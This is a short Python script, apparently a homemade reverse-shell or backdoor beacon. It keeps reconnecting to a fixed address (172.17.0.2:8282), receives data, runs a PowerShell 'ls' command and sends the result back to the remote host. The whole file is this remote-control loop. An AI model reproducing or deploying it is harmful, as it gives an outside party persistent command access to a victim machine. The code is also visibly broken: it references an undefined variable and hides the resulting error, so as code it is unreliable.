import socket
import subprocess
import time
h="172.17.0.2"
p=8282

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((h,p))
        while True:
            c=s.recv(1024).decode()
            # PowerShell을 사용하여 ls 명령어 실행
            result=subprocess.run(['powershell.exe', '-Command', 'ls'], stdout=subprocess.PIPE, text=True)
            result=output.stdout
            if(result==''):
                s.send("suc".encode())
            else:
                s.send(result.encode())
    except Exception as e:
        time.sleep(5)
